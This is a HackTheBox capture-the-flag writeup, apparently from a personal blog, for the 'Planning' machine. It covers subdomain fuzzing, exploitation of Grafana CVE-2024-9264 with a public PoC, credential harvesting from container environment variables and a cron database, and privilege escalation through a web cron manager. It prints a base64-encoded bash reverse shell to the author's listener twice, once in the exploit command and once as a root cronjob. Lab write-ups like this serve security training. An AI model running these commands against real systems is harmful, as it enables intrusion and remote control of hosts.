<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="index, follow">
    <title>Planning - Hexicon Archives</title>
    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
    <link rel="stylesheet" href="../style.css">
    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/Planning.html" />
    <!-- Machine-specific metadata for SEO -->
    <meta name="description" content="Detailed writeup for Planning machine from HackTheBox - Easy difficulty level">
    <meta name="keywords" content="HackTheBox, Planning, Easy, CTF, writeup, cybersecurity, penetration testing, Hexicon">
</head>
<body>
    <header>
        <div class="container header-content">
            <a href="../machines.html" class="logo">Machine writeups</a>
            <div class="header-controls">
                <a href="../index.html" class="htb-icon" title="Link to the main page">
                    <img src="../favicon.png" alt="Archive" width="30" height="30">
                </a>
                <div class="hamburger-menu">
                    <span></span>
                    <span></span>
                    <span></span>
                </div>
            </div>
        </div>
    </header>
    
    <div class="sidebar">
        <div class="difficulty-buttons">
            <button class="difficulty-btn" data-difficulty="easy">Easy</button>
            <div class="machine-list" id="easy-machines">
                <!-- Will be populated dynamically -->
            </div>
            
            <button class="difficulty-btn" data-difficulty="medium">Medium</button>
            <div class="machine-list" id="medium-machines">
                <!-- Will be populated dynamically -->
            </div>
            
            <button class="difficulty-btn" data-difficulty="hard">Hard</button>
            <div class="machine-list" id="hard-machines">
                <!-- Will be populated dynamically -->
            </div>

            <button class="difficulty-btn" data-difficulty="insane">Insane</button>
            <div class="machine-list" id="insane-machines">
                <!-- Will be populated dynamically -->
            </div>
        </div>
    </div>
    
    <div class="backdrop"></div>
    
    <main class="container writeup-content">
        <h1 class="writeup-title">Planning</h1>
        <div class="writeup-metadata">
            <span class="difficulty easy">Easy</span>
            <span class="date">September 13, 2025</span>
        </div>
        
        <div class="writeup-container">
            <div class="writeup-body">
                <!-- Machine-specific content goes here -->
                <p><img alt="pwned" src="../images/Planning/pwned.png" /></p>
<p>Planning was an easy-difficulty Linux box that began with subdomain enumeration to discover a Grafana instance running version 11.0.0.
Using provided admin credentials, I successfully authenticated to the Grafana interface and exploited CVE-2024-9264, an authenticated remote code execution vulnerability in the experimental SQL Expressions feature.
This vulnerability allowed me to execute arbitrary commands through insufficiently sanitized DuckDB queries, resulting in a root shell within the Grafana container.</p>
<p>Post-exploitation enumeration of the container's environment variables revealed hardcoded credentials for a user named Enzo.
These credentials provided SSH access to the underlying host system, establishing a foothold outside the containerized environment.
With limited privileges as Enzo, I conducted port enumeration and discovered an internal web service listening on port 8000.</p>
<p>Further system enumeration using LinPEAS revealed a critical file at /opt/crontabs/crontab.db containing JSON data with embedded credentials.
These credentials (root:P4ssw0rdS0pRi0T3c) granted access to the internal crontab management interface on port 8000.
By leveraging this web-based cron management system, I created a malicious scheduled task containing a Base64-encoded reverse shell payload.
Executing the crafted cronjob provided an immediate root shell on the host system, achieving complete system compromise through a combination of container escape techniques and privilege escalation via insecure cron management.</p>
<h1>User flag</h1>
<p><img alt="nmap" src="../images/Planning/nmap.png" /></p>
<p>Initial nmap scan reveals 2 ports. SSH on 22 and HTTP on 80. I'll begin by taking a look at the website.</p>
<p><img alt="website" src="../images/Planning/website.png" /></p>
<p>This looks like an online education website. While I was given credentials for the user admin, it seems like this website does not have a login feature.</p>
<h2>Discovering the Grafana subdomain</h2>
<p>I fuzzed the website for directories and subdomains using dirsearch and ffuf.</p>
<p>There were two interesting endpoints I could reach, and there was a single subdomain found. I had to use a few different wordlists to find this subdomain.</p>
<p><code>ffuf -u http://planning.htb -H 'Host: FUZZ.planning.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-spanish.txt -fs 178</code></p>
<p><img alt="fuzz" src="../images/Planning/fuzz.png" /></p>
<p>Grafana is an open-source analytics and visualization platform used to monitor, analyze, and visualize data from various sources. I will visit the subdomain now, keeping in mind that I have valid credentials for the user admin.</p>
<p><img alt="grafana" src="../images/Planning/grafana.png" /></p>
<p>The login page reveals the version of this Grafana instance, which is <code>11.0.0</code>. I will log in to Grafana with the provided credentials.</p>
<p><img alt="login" src="../images/Planning/login.png" /></p>
<p>I have successfully logged in to Grafana as the administrator.</p>
<h2>Abusing CVE-2024-9264 in Grafana</h2>
<p>Since I have the Grafana version, I will search for vulnerabilities.</p>
<p>I found CVE-2024-9264, which is an authenticated RCE via the experimental SQL Expressions feature. Due to insufficient sanitization of queries containing user input, it is possible to achieve RCE using any account with at least the VIEWER permission. Since I'm an admin here, this will not be an issue.</p>
<p><code>https://grafana.com/security/security-advisories/cve-2024-9264/</code>                                                                                                                                                                        <br />
<code>https://github.com/nollium/CVE-2024-9264</code>                                                                                                                                                                                                 </p>
<p>I'll clone this PoC script onto my machine. The only requirement, aside from a valid user, is that the DuckDB binary must be installed and present in Grafana's PATH.</p>
<p>I couldn't find a way to confirm the presence of DuckDB, so I'll quickly check whether this Grafana instance is vulnerable.</p>
<p><img alt="work" src="../images/Planning/work.png" />                                                                                                                                                                                                                          </p>
<p>This confirms the vulnerability. I can read files on the box, but I would prefer to get an actual shell. Since this worked, there is a high chance that RCE will be possible too.</p>
<p><code>python CVE-2024-9264.py -u admin -p 0D5oT70Fq13EvB5r -c "echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNjQvOTAwMSAgMD4mMQo= | base64 -d | bash" http://grafana.planning.htb</code></p>
<p>I base64-encoded a bash reverse shell, then piped the decoded command directly to bash. This can be done with curl and a python server, too.</p>
<p>The exploit hangs while running the DuckDB query as my listener captures the shell.</p>
<p><img alt="container" src="../images/Planning/container.png" /></p>
<h2>Reading the environmental variables of the container</h2>
<p>The fact that I got root directly from RCE, coupled with the hostname consisting of random letters and numbers, makes me think that I've landed in a container.</p>
<p>I'll take a look at a few things by hand. If nothing comes up, I will use LinPEAS to gather more information.</p>
<p>Environmental variables often contain sensitive data. I can get a list of all assigned variables by using the env command.</p>
<p><img alt="env" src="../images/Planning/env.png" /></p>
<p>There are credentials for the user Enzo set in the environmental variables. This user doesn't exist in the container, so I'll try to SSH into the main machine as them.</p>
<p><img alt="user" src="../images/Planning/user.png" /></p>
<h1>Root flag</h1>
<p>Enzo cannot run sudo on the box. I looked at active ports and found something interesting.</p>
<p><img alt="ports" src="../images/Planning/ports.png" /></p>
<p>Port 8000 is listed as active, so I'll forward it to my box using SSH.</p>
<p><img alt="anotherlogin" src="../images/Planning/anotherlogin.png" /></p>
<p>It required credentials, but none of the ones I've gathered so far were accepted.</p>
<h2>Discovering a new set of credentials</h2>
<p>I ran LinPEAS on the box, and it discovered an unusual file.</p>
<p><img alt="linpeas" src="../images/Planning/linpeas.png" /></p>
<p><code>/opt/crontabs/crontab.db</code> is a file that contains raw JSON data, which means that I should be able to read it.</p>
<div class="codehilite"><pre><span></span><code><span class="p">{</span><span class="s2">&quot;name&quot;</span><span class="p">:</span><span class="s2">&quot;Grafana backup&quot;</span><span class="p">,</span><span class="s2">&quot;command&quot;</span><span class="p">:</span><span class="s2">&quot;/usr/bin/docker save root_grafana -o /var/backups/grafana.tar &amp;&amp; /usr/bin/gzip /var/backups/grafana.tar &amp;&amp; zip -P P4ssw0rdS0pRi0T3c /var/backups/grafana.tar.gz.zip /var/backups/grafana.tar.gz &amp;&amp; rm /var/backups/grafana.tar.gz&quot;</span><span class="p">,</span><span class="s2">&quot;schedule&quot;</span><span class="p">:</span><span class="s2">&quot;@daily&quot;</span><span class="p">,</span><span class="s2">&quot;stopped&quot;</span><span class="p">:</span><span class="bp">false</span><span class="p">,</span><span class="s2">&quot;timestamp&quot;</span><span class="p">:</span><span class="s2">&quot;Fri Feb 28 2025 20:36:23 GMT+0000 (Coordinated Universal Time)&quot;</span><span class="p">,</span><span class="s2">&quot;logging&quot;</span><span class="p">:</span><span class="s2">&quot;false&quot;</span><span class="p">,</span><span class="s2">&quot;mailing&quot;</span><span class="p">:{},</span><span class="s2">&quot;created&quot;</span><span class="p">:</span><span class="mi">1740774983276</span><span class="p">,</span><span class="s2">&quot;saved&quot;</span><span class="p">:</span><span class="bp">false</span><span class="p">,</span><span class="s2">&quot;_id&quot;</span><span class="p">:</span><span class="s2">&quot;GTI22PpoJNtRKg0W&quot;</span><span class="p">}</span>
<span class="p">{</span><span class="s2">&quot;name&quot;</span><span class="p">:</span><span class="s2">&quot;Cleanup&quot;</span><span class="p">,</span><span class="s2">&quot;command&quot;</span><span class="p">:</span><span class="s2">&quot;/root/scripts/cleanup.sh&quot;</span><span class="p">,</span><span class="s2">&quot;schedule&quot;</span><span class="p">:</span><span class="s2">&quot;* * * * *&quot;</span><span class="p">,</span><span class="s2">&quot;stopped&quot;</span><span class="p">:</span><span class="bp">false</span><span class="p">,</span><span class="s2">&quot;timestamp&quot;</span><span class="p">:</span><span class="s2">&quot;Sat Mar 01 2025 17:15:09 GMT+0000 (Coordinated Universal Time)&quot;</span><span class="p">,</span><span class="s2">&quot;logging&quot;</span><span class="p">:</span><span class="s2">&quot;false&quot;</span><span class="p">,</span><span class="s2">&quot;mailing&quot;</span><span class="p">:{},</span><span class="s2">&quot;created&quot;</span><span class="p">:</span><span class="mi">1740849309992</span><span class="p">,</span><span class="s2">&quot;saved&quot;</span><span class="p">:</span><span class="bp">false</span><span class="p">,</span><span class="s2">&quot;_id&quot;</span><span class="p">:</span><span class="s2">&quot;gNIRXh1WIc9K7BYX&quot;</span><span class="p">}</span>
</code></pre></div>

<p>There is a password in this DB file. Aside from that, there is a command that creates a backup of the Grafana container daily.</p>
<p>While I don’t have a valid username for the login prompt, root is a common one for internal services, so I’ll test it first.</p>
<p><code>root | P4ssw0rdS0pRi0T3c</code></p>
<p>These credentials were accepted on the local website.</p>
<p><img alt="cron" src="../images/Planning/cron.png" /></p>
<h2>Creating a malicious cronjob via the Crontab UI</h2>
<p>I can create cronjobs that will be run on the system as root. I'll copy the command used in the first step.</p>
<p><code>echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuNjQvOTAwMSAgMD4mMQo= | base64 -d | bash</code></p>
<p>And I'll use it to create a new root reverse shell cronjob.</p>
<p><img alt="revshel" src="../images/Planning/revshell.png" /></p>
<p>I set the schedule to yearly, so that it won't execute on its own. I can run it on demand by clicking the <code>run now</code> button.</p>
<p><img alt="root" src="../images/Planning/root.png" /></p>
<p>Rooted!</p>
            </div>
            
            <div class="toc-sidebar">
                <h3>Contents</h3>
                <ul id="toc-list">
                    <!-- This will be populated by JavaScript -->
                </ul>
            </div>
        </div>
    </main>
    
    <!-- Mobile TOC toggle button -->
    <button class="toc-toggle" aria-label="Toggle table of contents">
        ≡
    </button>
    
    <footer>
        <div class="container">
            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
        </div>
    </footer>

    <!-- Include the Markdown parser (not needed for static HTML) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/marked/4.3.0/marked.min.js"></script>
    
    <script>
        // Machine metadata for sidebar population
        let machineData = {};
        
        // Function to initialize the application
        async function initializeApp() {
            try {
                // Fetch machine metadata
                const response = await fetch('../machines.json');
                if (!response.ok) {
                    throw new Error('Failed to load machine metadata');
                }
                machineData = await response.json();
                
                // Populate the sidebar with machine links
                populateSidebar();
                
                // Generate table of contents
                generateTableOfContents();
            } catch (error) {
                console.error('Initialization error:', error);
                showError("Failed to initialize application. Please refresh and try again.");
            }
        }

        // Call the initialization function when the page loads
        document.addEventListener('DOMContentLoaded', initializeApp);

        // Populate sidebar with machine links dynamically
        function populateSidebar() {
            const categories = {
                "easy": document.getElementById("easy-machines"),
                "medium": document.getElementById("medium-machines"),
                "hard": document.getElementById("hard-machines"),
                "insane": document.getElementById("insane-machines")
            };

            // Clear existing links
            for (const category of Object.values(categories)) {
                category.innerHTML = '';
            }

            // Add machine links to appropriate categories
            for (const [machineName, data] of Object.entries(machineData)) {
                const difficulty = data.difficulty.toLowerCase();
                if (categories[difficulty]) {
                    const link = document.createElement('a');
                    link.href = `../machines/${machineName}.html`;
                    link.textContent = data.title;
                    
                    // Highlight current machine
                    if (data.title === "Planning") {
                        link.classList.add('active');
                    }
                    
                    categories[difficulty].appendChild(link);
                }
            }
        }

        // Generate table of contents from headings
        function generateTableOfContents() {
            const writeupBody = document.querySelector('.writeup-body');
            const tocList = document.getElementById('toc-list');
            const headings = writeupBody.querySelectorAll('h1, h2, h3');
            
            // Clear existing TOC
            tocList.innerHTML = '';
            
            headings.forEach((heading, index) => {
                // Create an ID for the heading if it doesn't have one
                if (!heading.id) {
                    // Convert heading text to kebab-case for ID
                    const headingText = heading.textContent.trim();
                    const headingId = headingText
                        .toLowerCase()
                        .replace(/[^\w\s-]/g, '')
                        .replace(/\s+/g, '-');
                    
                    heading.id = headingId || `section-${index}`;
                }
                
                // Create a list item for the TOC
                const listItem = document.createElement('li');
                const link = document.createElement('a');
                link.href = `#${heading.id}`;
                link.textContent = heading.textContent;
                
                // Add a class for h2 elements to create indentation
                if (heading.tagName === 'H2') {
                    listItem.classList.add('sub-heading');
                    listItem.style.paddingLeft = '15px';
                } else if (heading.tagName === 'H3') {
                    listItem.classList.add('sub-sub-heading');
                    listItem.style.paddingLeft = '30px';
                }
                
                listItem.appendChild(link);
                tocList.appendChild(listItem);
            });
            
            // Set up scroll highlighting
            setupScrollHighlighting();
        }

        // Highlight active TOC section on scroll
        function setupScrollHighlighting() {
            const tocLinks = document.querySelectorAll('.toc-sidebar a');
            
            function highlightActiveSection() {
                // Find which section is currently in view
                const fromTop = window.scrollY + 120;
                
                tocLinks.forEach(link => {
                    const section = document.querySelector(link.hash);
                    
                    if (section && 
                        section.offsetTop <= fromTop &&
                        section.offsetTop + section.offsetHeight > fromTop) {
                        link.classList.add('active');
                    } else {
                        link.classList.remove('active');
                    }
                });
            }
            
            // Call initially and on scroll
            window.addEventListener('scroll', highlightActiveSection);
            highlightActiveSection();
        }

        // Show error message
        function showError(message) {
            const contentArea = document.querySelector('.writeup-body');
            contentArea.innerHTML = `
                <div class="error-message">
                    <h2>Error</h2>
                    <p>${message}</p>
                </div>
            `;
        }

        // Initialize the page
        document.addEventListener('DOMContentLoaded', function() {
            // Hamburger menu functionality
            const hamburgerMenu = document.querySelector('.hamburger-menu');
            const sidebar = document.querySelector('.sidebar');
            const backdrop = document.querySelector('.backdrop');
            
            hamburgerMenu.addEventListener('click', () => {
                hamburgerMenu.classList.toggle('active');
                sidebar.classList.toggle('active');
                backdrop.classList.toggle('active');
            });
            
            backdrop.addEventListener('click', () => {
                hamburgerMenu.classList.remove('active');
                sidebar.classList.remove('active');
                backdrop.classList.remove('active');
                tocSidebar.classList.remove('active');
            });
            
            // Difficulty buttons functionality
            const difficultyButtons = document.querySelectorAll('.difficulty-btn');
            
            difficultyButtons.forEach(button => {
                button.addEventListener('click', () => {
                    const difficulty = button.getAttribute('data-difficulty');
                    const machineList = document.querySelector(`#${difficulty}-machines`);
                    
                    machineList.classList.toggle('active');
                });
            });
            
            // Mobile TOC toggle
            const tocToggle = document.querySelector('.toc-toggle');
            const tocSidebar = document.querySelector('.toc-sidebar');
            
            tocToggle.addEventListener('click', () => {
                tocSidebar.classList.toggle('active');
                backdrop.classList.toggle('active');
            });
            
            // Close TOC sidebar when clicking on a link (mobile)
            document.querySelectorAll('.toc-sidebar a').forEach(link => {
                link.addEventListener('click', () => {
                    if (window.innerWidth <= 1024) {
                        tocSidebar.classList.remove('active');
                        backdrop.classList.remove('active');
                    }
                });
            });
        });

        // Add smooth scrolling for TOC links
        document.addEventListener('click', function(e) {
            if (e.target.tagName === 'A' && e.target.hash) {
                const element = document.querySelector(e.target.hash);
                if (element) {
                    e.preventDefault();
                    window.scrollTo({
                        top: element.offsetTop - 90,
                        behavior: 'smooth'
                    });
                }
            }
        });
    </script>
</body>
</html>